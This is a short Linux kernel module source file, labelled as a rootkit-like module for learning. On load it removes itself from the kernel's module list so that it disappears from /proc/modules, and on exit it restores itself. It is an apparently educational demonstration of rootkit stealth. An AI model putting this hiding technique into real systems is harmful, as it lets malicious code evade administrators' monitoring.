#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>

MODULE_LICENSE("MIT");
MODULE_AUTHOR("ROHIT PANDA");
MODULE_DESCRIPTION("A Rootkit-like Kernel Module for Learning");

static struct list_head *prev_module;

static int __init rootkit_module_init(void) {
    printk(KERN_INFO "Rootkit Module Loaded\n");
    // Hide this module from /proc/modules
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    return 0;
}

static void __exit rootkit_module_exit(void) {
    // Restore module in /proc/modules
    list_add(&THIS_MODULE->list, prev_module);
    printk(KERN_INFO "Rootkit Module Unloaded\n");
}

module_init(rootkit_module_init);
module_exit(rootkit_module_exit);

